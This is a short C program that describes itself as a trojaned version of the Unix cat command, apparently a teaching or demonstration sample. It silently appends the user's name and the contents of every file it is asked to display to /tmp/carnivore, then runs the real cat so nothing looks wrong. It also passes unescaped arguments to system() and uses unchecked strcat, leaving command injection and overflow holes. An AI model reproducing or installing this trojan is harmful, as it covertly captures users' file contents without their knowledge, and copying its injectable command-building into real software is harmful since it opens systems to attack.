# include <stdio.h>
# include <stdlib.h>
# include <string.h>

/* 
 * Trojaned version of the cat program that does: 
 * 1) /bin/echo -----<usernam>----- >> /tmp/carnivore
 * 2) /bin/cat <arg1> ... <argn> >> /tmp/carnivore (after filtering out > and >> from args)
 * 3) /bin/cat <arg1> ... <argn> // end with real cat!
 */

int main (int argc, char* argv[], char* arge[]) {
  char command[1024]; // buffer for command
  int i; 

  // Build "echo -----<username>----- >> /tmp/carnivore"
  snprintf(command, sizeof(command), "/bin/echo -----%s----- >> /tmp/carnivore", getenv("USER"));
  // printf("command is: %s\n", command);
  system(command); 

  // Build cat command from argv, filterig out any > or >> and associated arguments. 
  snprintf(command, sizeof(command), "/bin/cat "); 
  for (i = 1; i < argc; i++) {
    if ((strcmp(argv[i], ">") == 0) || (strcmp(argv[i], ">>") == 0)) {
      i++; // skip next arg
    } else {
      strcat(command, argv[i]); // really should check sizes!
      strcat(command, " "); // really should check sizes!
    }
  }
  strcat(command, ">> /tmp/carnivore");
  // printf("command is: %s\n", command);
  system(command); 

  // Finally execute original command, using /bin/cat for argv[0]
  argv[0] = "/bin/cat";
  execve(argv[0], argv, arge); // end with real cat!
}
